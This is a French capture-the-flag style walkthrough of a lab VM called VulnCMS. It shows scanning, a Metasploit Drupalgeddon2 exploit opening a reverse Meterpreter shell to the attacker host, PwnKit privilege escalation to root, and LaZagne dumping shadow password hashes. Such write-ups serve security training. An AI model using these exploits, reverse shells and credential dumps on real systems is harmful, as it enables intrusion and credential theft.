# VulnCMS

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $sudo massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] IP: 192.168.56.25
[i] Rate: 1000
 
🔥 Masscan 192.168.56.25...100%
👁️ Nmap 192.168.56.25...100%
 
[+] 22/tcp open
[+] 8081/tcp open
[+] 9001/tcp open
[+] 80/tcp open
[+] 5000/tcp open
 
==========================================================
|                         📑 Rapports                    |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.25-tcp.html      |
==========================================================
```

&nbsp;

**📑 Rapport nmap**

Vulnérabilité potentiel de `Drupal v7` sur le port 9001

<img width="379" height="171" alt="drupal-7" src="https://github.com/user-attachments/assets/04866a57-2bc9-4789-a313-8af226f45804" />


&nbsp;

**<span style="color: #dddddd;">💥</span> Metasploit - drupal_drupalgeddon2**

Exploitation de la `CVE` **(CVE-2018-7600)**

```
[msf](Jobs:0 Agents:0) exploit(unix/webapp/drupal_drupalgeddon2) >> run
[*] Started reverse TCP handler on 192.168.56.149:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (40004 bytes) to 192.168.56.25
[*] Meterpreter session 1 opened (192.168.56.149:4444 -> 192.168.56.25:43256) at 2025-12-22 10:05:51 +0100

(Meterpreter 1)(/var/www/html/drupal) > 
```

&nbsp;

🛰️ **fullEx**

Élévation de privilège

```
www-data@vuln_cms:/tmp/fullEx$ bash fullEx.sh -perm
bash fullEx.sh -perm
www-data@vuln_cms:/tmp/fullEx$ ./fullEx.sh -LinPeas
./fullEx.sh -LinPeas

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main


```

&nbsp;

Test de l’exploit `PwnKit`

```
www-data@vuln_cms:/tmp/fullEx$ ./fullEx.sh -PwnKit64
./fullEx.sh -PwnKit64
bash -i
root@vuln_cms:/tmp/fullEx# 
```

&nbsp;

Recherche d’identifiant sur la machine

```
root@vuln_cms:/tmp/fullEx# ./fullEx.sh -LaZagne
./fullEx.sh -LaZagne

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: ghost
Hash: $6$6SzeyUv2$q5ugnBtOQEHLrnU7npoTkDFkA0NXtA0zKdO72ENHM0xVKBZ7xuEFgTmv1AtNTiPWft/KOxPvsF9Z1LDRe9N0U1:18779:0:99999:7:::

[+] Hash found !!!
Login: tyrell
Hash: $6$zZFLwTUT$VnizhY9mW3JrQEaP9yASnF7bsYDwbHOGyHPg6OrxaDehkP4hFY.sNSm2kc7jcdjMW.Uooazycc3HZ.Ps08q8B1:18778:0:99999:7:::

[+] Hash found !!!
Login: elliot
Hash: $6$AFoW7CYK$dGrx4WQq81KUcOkqAj.q5grgs3.knHnDjZYKKXkkYDfpbuHC.r7GOUaj67CFNuZlbEAK1aydVWKkFgw3lvhel1:18778:0:99999:7:::

------------------- Grub passwords -----------------

[+] Hash found !!!
Hash: $1$gLhU0/$aW78kHK1QfV3P2b2znUoe/


[+] 4 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.08182668685913086

```
